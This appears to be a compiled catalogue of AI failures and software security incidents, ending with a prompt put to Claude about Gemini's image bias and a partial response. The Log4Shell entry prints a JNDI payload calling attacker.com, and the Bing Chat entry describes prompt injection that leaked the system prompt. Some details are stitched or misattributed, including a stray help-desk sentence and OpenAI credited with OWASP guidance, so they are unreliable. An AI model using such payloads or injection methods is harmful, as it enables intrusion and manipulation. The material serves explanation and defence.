#### 1. Google Bard Hallucination - JWST Factual Error (February 2023)

**Source:** CNN Business - https://www.cnn.com/2023/02/08/tech/google-ai-bard-demo-error

**Description:** In a promotional video published on 6 February 2023, Google's Bard chatbot (now Gemini) was asked what new discoveries from the James Webb Space Telescope it could explain to a child. Bard stated that JWST "took the very first pictures of a planet outside of our own solar system." That claim was factually incorrect: the first direct image of an exoplanet was captured by the European Southern Observatory's Very Large Telescope in 2004 - 17 years before JWST launched. Reuters identified the error on the same day as a major Google AI event in Paris.

**Type:** AI/LLM

**Severity:** Critical (business and reputational)

**Consequences:** Alphabet's share price fell approximately 7.7% within hours, removing roughly **$100 billion** in market capitalisation. The incident raised serious doubts about the reliability of Bard before it had even launched publicly and gave a significant PR advantage to OpenAI's ChatGPT. It became the defining early example of LLM hallucination in a high-stakes commercial context.

**Solution:** Google delayed the public release of Bard to add further fact-checking safeguards, conducted additional internal red-teaming, and later added real-time web grounding to reduce factual errors. The model was subsequently renamed Gemini with improved accuracy benchmarks.

#### 2. ChatGPT Fabricated Legal Citations - *Mata v. Avianca* (May 2023)

**Source:** MIT Sloan Teaching & Learning Technologies - https://mitsloanedtech.mit.edu/ai/basics/addressing-ai-hallucinations-and-bias/

**Description:** In a personal injury lawsuit filed in the U.S. District Court for the Southern District of New York, attorneys Steven Schwartz and Peter LoDuca submitted a legal brief containing six case citations generated by ChatGPT. None of the cases existed. The fabricated citations included fake case names, fake docket numbers, and fake legal reasoning. When the attorneys asked ChatGPT to verify the citations, the model confirmed they were real and claimable on LexisNexis and Westlaw - a second-order hallucination.

**Type:** AI/LLM

**Severity:** Critical

**Consequences:** Federal Judge P. Kevin Castel found the lawyers had acted with "subjective bad faith" and sanctioned both attorneys and their firm **$5,000** under Federal Rule of Civil Procedure 11. The case became the most widely cited example of AI hallucination risk in professional settings worldwide and prompted guidance from bar associations across multiple jurisdictions.

**Solution:** Courts in multiple countries issued standing orders requiring disclosure when AI tools are used to prepare legal filings. Law firms introduced mandatory AI-verification policies, and OpenAI added more prominent disclaimers recommending independent verification of all factual claims.

#### 3. Google Gemini Image Generation Racial Bias (February 2024)

**Source:** NPR - https://www.npr.org/2024/02/28/1234532775/google-gemini-offended-users-images-race

**Description:** Shortly after Google added image-generation capabilities to Gemini (formerly Bard), users reported severe historical inaccuracies caused by an over-correction for diversity bias. When prompted to generate images of historical groups - U.S. Founding Fathers, 1943 German soldiers, medieval English kings, Viking warriors - the model consistently substituted racially diverse figures where historical context called for specific demographics. The system also refused to generate images of "white people" while fulfilling similar requests for other racial groups, exposing an asymmetric bias in its training and RLHF fine-tuning.

**Type:** AI/LLM

**Severity:** Critical (trust, bias, and accuracy)

**Consequences:** Google's CEO Sundar Pichai publicly apologised, stating the results "offended our users." Google suspended Gemini's image-generation-of-people feature entirely in February 2024 - an unprecedented rollback for a major product feature. Alphabet's stock fell further. The incident renewed global debate about how AI developers address bias and whether diversity-driven fine-tuning can unintentionally introduce new biases.

**Solution:** Google suspended image generation of people while conducting an extensive audit of training data and RLHF reward signals. Re-introduction of the feature was phased, with revised guidelines requiring historically accurate outputs and clearer handling of demographic prompts.

#### 4. Bing Chat / ChatGPT Prompt Injection - System Prompt Leak (February–December 2023)

**Source:** Wikipedia - Prompt Injection - https://en.wikipedia.org/wiki/Prompt_injection

**Description:** In February 2023, a Stanford student demonstrated that Microsoft's Bing Chat (powered by GPT-4) could be manipulated via direct prompt injection to ignore its prior instructions, revealing internal hidden system directives and its codename "Sydney." Another researcher verified the exploit by posing as an OpenAI developer. Separately, in December 2024, The Guardian reported that OpenAI's ChatGPT Search tool was vulnerable to indirect prompt injection: malicious content embedded in webpages could alter ChatGPT's summarised responses to users - without the user or the model detecting the attack.

**Type:** AI/LLM

**Severity:** High

**Consequences:** Confidential system prompt contents were exposed to the public; organisations deploying custom GPT-powered tools found that proprietary instructions and API keys could be leaked through crafted user queries. The ChatGPT Search vulnerability meant end-users could receive deliberately manipulated information when searching the web.

**Solution:** Microsoft updated Bing Chat's system controls and added SSRF protections. OpenAI patched the ChatGPT Search indirect injection vulnerability and issued OWASP guidance (LLM01: Prompt Injection) recommending input sanitisation, trust boundaries between data and instruction planes, and human-in-the-loop verification for sensitive actions.

#### 5. OpenAI Whisper Medical Transcription Hallucinations (2023–2024)

**Source:** Morph AI - https://www.morphllm.com/ai-hallucination-examples

**Description:** OpenAI's Whisper speech-to-text model - used by over 30,000 medical workers for patient-visit transcription - was found in a 2024 study to hallucinate in approximately **1.4%** of transcriptions. The hallucinations were not minor: Whisper invented entire sentences, fabricated medication names such as "hyperactivated antibiotics," and in some cases injected racially charged remarks into transcripts of patients with aphasia. OpenAI's own documentation advised against deploying Whisper in "high-risk domains," yet its adoption in clinical settings continued.

**Type:** AI/LLM

**Severity:** High

**Consequences:** Fabricated medication names and procedures in medical records pose direct patient safety risks, including misdiagnosis, wrong medication dispensed, and incorrect treatment plans. The defect also carries significant medical-legal liability. Multiple healthcare providers were required to audit existing Whisper-generated transcripts.

**Solution:** OpenAI added explicit warnings in its documentation against high-stakes medical use. Healthcare organisations were advised to implement human review for all AI-generated transcripts and to adopt post-processing validators. More rigorous domain-specific fine-tuning and hallucination-detection layers have been recommended by independent researchers.

#### 6. Samsung / ChatGPT Proprietary Data Leakage via LLM (April 2023)

**Source:** AI Incident Database - https://incidentdatabase.ai/cite/768/

**Description:** Within 20 days of Samsung allowing its semiconductor engineers to use ChatGPT for work tasks, three separate incidents occurred in which employees entered confidential intellectual property into the public model. In the first incident, an engineer pasted proprietary semiconductor database source code to check for errors; in the second, another engineer uploaded defect-detection algorithms for manufacturing equipment; in the third, an employee fed a recorded transcript of a confidential internal meeting into ChatGPT to generate minutes. Under OpenAI's terms of service at the time, submitted content could be used to improve training data.

**Type:** AI/LLM

**Severity:** High

**Consequences:** Core trade secrets in one of the world's most competitive industries - semiconductor manufacturing processes, defect algorithms, internal strategy - were exposed to OpenAI's servers with no NDA, no data-residency controls, and no mechanism for deletion. Samsung immediately banned all generative AI tools on company devices and networks, and announced the development of an internal AI system.

**Solution:** Samsung implemented a company-wide ban on third-party AI tools and built Samsung Gauss as an enterprise-controlled alternative. The incident established the industry norm for AI governance policies: organisations now routinely classify data tiers, implement DLP (data loss prevention) controls for AI inputs, and train employees on what data may or may not be submitted to external AI models.

#### 7. Meta Galactica LLM - Scientific Misinformation (November 2022)

**Source:** IBM Think Topics - https://www.ibm.com/think/topics/ai-hallucinations

**Description:** In November 2022, Meta released a public demo of Galactica, an open-source LLM trained on millions of scientific texts including academic papers, textbooks, and encyclopaedias. Within days, researchers demonstrated that the model confidently generated plausible-sounding but factually incorrect scientific content - including fake citations, inaccurate descriptions of chemical compounds, and fabricated historical facts - and presented them in authoritative academic prose. The model was also found to generate content rooted in social prejudice.

**Type:** AI/LLM

**Severity:** Medium (demo context), High if deployed operationally

**Consequences:** Meta pulled the public Galactica demo after just **three days** - one of the fastest retractions of a major AI demo in history. The incident became a landmark case study in the danger of deploying LLMs in scientific or educational contexts without strong hallucination safeguards, and influenced subsequent AI safety research.

**Solution:** Meta retracted the demo and invested in retrieval-augmented generation (RAG) approaches and citation verification mechanisms. The episode led to industry-wide calls for "grounded" LLMs that reference sources rather than generating from parametric memory alone.

#### 8. CrowdStrike Falcon Sensor Update - Global IT Outage (July 2024)

**Source:** Wikipedia - 2024 CrowdStrike-related IT outages - https://en.wikipedia.org/wiki/2024_CrowdStrike-related_IT_outages

**Description:** On 19 July 2024 at 04:09 UTC, CrowdStrike distributed a faulty configuration update ("Channel File 291") for its Falcon Sensor security software on Windows hosts. The update caused an out-of-bounds memory read in the Windows kernel sensor driver (CSagent.sys), producing an invalid page fault and triggering a Blue Screen of Death (BSoD) on every affected machine. Systems either entered a boot loop or booted into recovery mode, requiring manual intervention on each device. The root cause was a defect in the automated content validation pipeline that failed to detect a malformed sensor configuration file.

**Type:** Security / Update

**Severity:** Critical

**Consequences:** Approximately **8.5 million** Windows systems crashed worldwide - the largest IT outage in recorded history. Airlines grounded flights (Delta Air Lines alone lost ~$500 million), hospitals reverted to paper records, banks halted transactions, and emergency services were disrupted. U.S. Fortune 500 companies suffered an estimated **$5.4 billion** combined loss. Delta sued CrowdStrike for negligence; a class-action lawsuit accused CrowdStrike of making false statements about its testing procedures.

**Solution:** CrowdStrike issued a manual remediation process requiring booting affected machines into safe mode and deleting the faulty Channel File 291. The company subsequently committed to staggered rollouts, canary deployments, enhanced content validation, and allowing customers to control update timing. Microsoft and CrowdStrike both advocated for reducing kernel-level access for security software.

#### 9. Log4Shell - Apache Log4j Remote Code Execution (CVE-2021-44228, exploited through 2022)

**Source:** Huntress Threat Library - https://www.huntress.com/threat-library/vulnerabilities/cve-2021-44228

**Description:** Disclosed on 9 December 2021 and widely exploited throughout 2022, Log4Shell is a remote code execution vulnerability in Apache Log4j 2 (a widely used Java logging library) caused by insufficient sanitisation of user-supplied data in the JNDI lookup feature. An attacker could send a specially crafted string - such as `${jndi:ldap://attacker.com/exploit}` - that Log4j would attempt to resolve, fetching and executing attacker-controlled Java code. The vulnerability received the maximum CVSS score of **10.0** and affected millions of servers running any Java application that used Log4j 2 versions prior to 2.15.0.

**Type:** Security / RCE

**Severity:** Critical (CVSS 10.0)

**Consequences:** Nation-state actors, ransomware groups, and cryptocurrency miners immediately began exploiting the flaw at scale - Akamai recorded approximately 2 million attack attempts per hour in the first week. VMware Horizon servers, government systems, financial institutions, and cloud platforms were compromised. One in four applications was still found to be vulnerable a full year later, according to data published in December 2023. CISA mandated emergency patching for all U.S. federal agencies.

**Solution:** Apache released Log4j 2.15.0 (disabling JNDI by default) and then 2.16.0 (completely removing Message Lookups). Organisations were required to audit all Java applications, update the library, or remove the vulnerable JndiLookup class. Network egress filtering to block outbound LDAP and RMI calls provided interim mitigation.

#### 10. MOVEit Transfer SQL Injection Zero-Day (CVE-2023-34362, May 2023)

**Source:** Wikipedia - 2023 MOVEit data breach - https://en.wikipedia.org/wiki/2023_MOVEit_data_breach

**Description:** In May 2023, a critical SQL injection vulnerability in Progress Software's MOVEit managed file transfer platform allowed unauthenticated attackers to access and extract data from MOVEit Transfer databases. The Cl0p ransomware group had been holding the zero-day for months before launching a coordinated mass-exploitation campaign. The flaw arose from improper neutralisation of SQL input in the web application layer, a classic CWE-89 vulnerability.

**Type:** Security / SQL Injection

**Severity:** Critical

**Consequences:** Over **2,700 organisations** and approximately **93.3 million individuals** had data compromised, spanning healthcare, finance, government, and education sectors. Victims included the U.S. Department of Energy, British Airways, the BBC, Shell, and numerous U.S. state government agencies. It became one of the largest mass data breaches of the decade.

**Solution:** Progress Software issued an emergency patch (MOVEit Transfer 2023.0.1 and related versions) within days of public disclosure. CISA issued an emergency directive mandating immediate patching for federal agencies. Organisations were advised to disable all HTTP/HTTPS traffic to MOVEit Transfer until patched, apply IP whitelisting, and audit transferred files for indicators of compromise.

#### 11. Microsoft Exchange "ProxyNotShell" Zero-Days (CVE-2022-41040 & CVE-2022-41082, September 2022)

**Source:** CSO Online - https://www.csoonline.com/article/574205/microsoft-exchange-proxynotshell-vulnerability-explained-and-how-to-mitigate-it.html

**Description:** Two chained zero-day vulnerabilities in Microsoft Exchange Server on-premises (versions 2013, 2016, 2019) were discovered being actively exploited in the wild from at least September 2022. CVE-2022-41040 is a Server-Side Request Forgery (SSRF) flaw allowing an authenticated attacker to reach Exchange's privileged PowerShell backend. CVE-2022-41082 is a deserialisation flaw that enables Remote Code Execution via that backend. Chained together, the two vulnerabilities allow an attacker with a standard user account to execute arbitrary code on the Exchange server.

**Type:** Security / RCE

**Severity:** Critical

**Consequences:** Attackers created web shells on compromised Exchange servers, enabling persistent access and lateral movement. Over **197,000** unpatched internet-facing Exchange OWA instances were detected on Shodan at peak exposure. In January 2023, approximately 60,000 servers were still unpatched. A new exploit chain called "OWASSRF" allowed attackers to bypass Microsoft's initial URL-Rewrite mitigations, catching organisations that believed they were already protected.

**Solution:** Microsoft released official patches in its November 2022 Patch Tuesday update. Organisations were urged to apply patches immediately, or as interim mitigation to configure URL Rewrite rules to block the exploitation path and restrict remote PowerShell access. CISA added both CVEs to its Known Exploited Vulnerabilities catalogue.

#### 12. Cisco IOS XE Zero-Day Web UI RCE (CVE-2023-20198, October 2023)

**Source:** UpGuard - https://www.upguard.com/blog/cisco-cve-2023

**Description:** In October 2023, Cisco disclosed a critical zero-day vulnerability (CVSS 10.0) in the web user interface (Web UI) feature of Cisco IOS XE software. An unauthenticated remote attacker could exploit the flaw to create a local user account with full administrative access and subsequently deploy malicious implants on affected network devices. A second chained vulnerability CVE-2023-20273 was then used to write a web shell for persistent access. Cisco had clearly stated that the Web UI should never be exposed to the public internet, yet thousands of devices had been misconfigured to allow this.

**Type:** Security / RCE

**Severity:** Critical (CVSS 10.0)

**Consequences:** Within days of disclosure, security researchers detected over **40,000** compromised Cisco IOS XE devices bearing the attacker's implant. Routers and switches used by enterprises, ISPs, and government entities were affected. The compromised devices could be used for network interception, data extraction, and as entry points for deeper network infiltration.

**Solution:** Cisco released patched software (IOS XE 17.9.4a and subsequent versions). As immediate mitigation, Cisco directed customers to disable the HTTP/HTTPS server feature on all internet-facing systems. CISA issued an emergency directive requiring all federal civilian agencies to apply mitigations or take affected devices offline within two weeks.

#### 13. Fortinet FortiOS SSL VPN Heap Buffer Overflow (CVE-2023-27997, June 2023)

**Source:** Help Net Security - https://www.helpnetsecurity.com/2024/02/12/critical-fortinet-fortios-flaw-exploited-in-the-wild-cve-2024-21762/

**Description:** CVE-2023-27997 is a pre-authentication heap-based buffer overflow vulnerability in the SSL VPN component of Fortinet FortiOS and FortiProxy. An unauthenticated remote attacker can craft a malicious request to trigger the overflow, leading to arbitrary code execution. The vulnerability was discovered during a red team engagement and subsequently identified as having been exploited as a zero-day in limited attacks before disclosure in June 2023. It was later combined with CVE-2022-42475 in multi-stage attacks by Chinese state-sponsored APTs.

**Type:** Security / RCE

**Severity:** Critical

**Consequences:** Chinese APT groups and other nation-state actors exploited both vulnerabilities to target government agencies, defence organisations, and critical infrastructure globally, including the Dutch Ministry of Defence. In April 2025, Fortinet revealed that attackers had created symbolic links within system directories to maintain persistent read-only access even after patching, allowing continued covert data extraction.

**Solution:** Fortinet released patches for affected FortiOS versions and urged customers to upgrade immediately. The company also issued an advisory recommending customers to disable SSL VPN where not required. CISA and partners issued a joint advisory and added the CVEs to the Known Exploited Vulnerabilities catalogue.

#### 14. Apple iOS Zero-Day Kernel Out-of-Bounds Write (CVE-2022-42827, October 2022)

**Source:** 9to5Mac - https://9to5mac.com/2022/10/26/zero-day-vulnerability/

**Description:** CVE-2022-42827 is an out-of-bounds write vulnerability in the iOS and iPadOS kernel, disclosed by Apple in October 2022 alongside the release of iOS 16.1. An application - including a malicious one - could exploit this flaw to execute arbitrary code with kernel privileges, enabling full device compromise, spyware installation, or privilege escalation. Apple confirmed it was "aware of a report that this issue may have been actively exploited." This was Apple's eighth or ninth actively exploited zero-day fixed in 2022.

**Type:** Security / Privilege Escalation

**Severity:** High

**Consequences:** Active exploitation in the wild, likely through targeted spyware implants consistent with the Pegasus and commercial spyware threat landscape. The flaw affected iPhones from the iPhone 8 upwards and corresponding iPad generations. Any app on a vulnerable device could have been used to gain kernel-level control.

**Solution:** Apple released iOS 16.1 and iPadOS 16, addressing the flaw with improved bounds checking. CISA added CVE-2022-42827 to its Known Exploited Vulnerabilities catalogue with a mandatory remediation deadline for U.S. government agencies. Users were advised to update immediately.

#### 15. Microsoft Windows Print Spooler "PrintNightmare" (CVE-2021-34527, actively exploited 2022)

**Source:** CISA Known Exploited Vulnerabilities - https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**Description:** PrintNightmare, first disclosed in June 2021, remained one of the most actively exploited vulnerabilities well into 2022. The flaw in the Windows Print Spooler service allows authenticated attackers to achieve Remote Code Execution or Local Privilege Escalation by abusing the `AddPrinterDriver` function to load a malicious DLL. The vulnerability was particularly harmful because it affected every version of Windows and because successful exploitation did not require physical access.

**Type:** Security / RCE

**Severity:** High (CVSS 8.8)

**Consequences:** Ransomware groups (including Vice Society and Magniber) continued using PrintNightmare throughout 2022 to escalate privileges and deploy ransomware on Windows domain environments. It had a disproportionate impact on organisations slow to patch or without central patch management. Schools, hospitals, and local government bodies were frequent victims.

**Solution:** Microsoft issued multiple patches (some requiring manual registry key changes) and ultimately restricted driver installation to administrators via Point and Print policy changes in August 2021 updates, fully enforced from 2022. Disabling the Print Spooler service on domain controllers and non-printing servers was strongly recommended.

#### 16. Fortinet FortiManager Authentication Bypass Zero-Day (CVE-2024-47575, October 2024)

**Source:** The Stack - https://www.thestack.technology/fortinet-zero-day-fortiguard-vulnerability-cve-2024-47575/

**Description:** CVE-2024-47575 is a "missing authentication for critical function" vulnerability (CWE-306, CVSS 9.8) in Fortinet's FortiManager network management platform. An unauthenticated remote attacker could exploit the flaw to execute arbitrary code or commands by sending crafted requests. Fortinet confirmed attackers had already automated the exploitation, scripting mass extraction of managed device IP addresses, credentials, and configurations from FortiManager instances.

**Type:** Security / Authentication Bypass

**Severity:** Critical (CVSS 9.8)

**Consequences:** Attackers extracted IP addresses, authentication credentials, and full network configurations from managed FortiGate firewalls at managed service providers and government customers. This gave threat actors a detailed map of their victims' network topologies. CISA added the vulnerability to its Known Exploited Vulnerabilities catalogue and mandated emergency remediation.

**Solution:** Fortinet released patches for FortiManager 7.x, 6.x, and other affected branches. Workarounds included restricting which FortiGate serial numbers were allowed to register, enabling the "fgfm-deny-unknown" flag, and implementing IP allowlisting for management interfaces. Organisations were advised to immediately audit FortiManager logs for evidence of prior compromise.

#### 19. Cisco IOS XE Persistent Implant - Post-Exploitation Backdoor (October–November 2023)

**Source:** UpGuard - https://www.upguard.com/blog/cisco-cve-2023

**Description:** Following the mass exploitation of CVE-2023-20198 (see entry 12), a second critical vulnerability CVE-2023-20273 (CVSS 7.2) was discovered being chained by the same threat actor to deploy a Lua-based web shell implant on compromised Cisco IOS XE devices. What made this incident particularly notable is that the attacker subsequently updated the implant to check for an authentication header and respond only to requests bearing a specific credential - effectively making the implant invisible to standard detection tools that simply checked for its presence.

**Type:** Security / Backdoor

**Severity:** High

**Consequences:** The "invisible implant" update caused initial security scans to under-count compromised devices dramatically - from 40,000 or more to near zero - before the correct detection method was identified. **Solution:** Cisco patched both CVE-2023-20198 and CVE-2023-20273 together and published updated guidance on detecting the implant using specific HTTP requests with the correct header format. Network defenders were advised to audit Cisco device logs for account creation events and to inspect devices with forensic tools rather than relying solely on network-based detection.

The incident reinforced industry guidance on strengthening IT help desk procedures against social engineering, including out-of-band identity verification and privileged access management.

### Where the AI is biased or hallucinates when explaining the defect.

#### Prompt 1

I asked Claude for "Google Gemini Image Generation Racial Bias" Defect: "Explain why Google Gemini generated racist images in 2024. What internal training data caused the issue?"

#### Prompt 1's Response

```
A few things worth clarifying upfront, since the framing of your question matters here.

**The images weren't "racist" in the traditional sense** - the problem was essentially the opposite: an over-correction for diversity that produced historically inaccurate outputs. America's Founding Fathers were depicted as Black women, and Ancient Greek warriors as Asian men and women. This was jarring and wrong, but the underlying cause was an aggressive diversity intervention gone too far, not a system designed to demean any group.

---

**What actually caused it?**

There were two interlocking technical issues:

**1. A blanket diversity prompt injection**

Google appears to have added hidden instructions to user prompts to ensure diverse results. A prompt like "generate an image of a programmer" would effectively be rewritten as "generate an image of a programmer keeping diversity in mind."
```
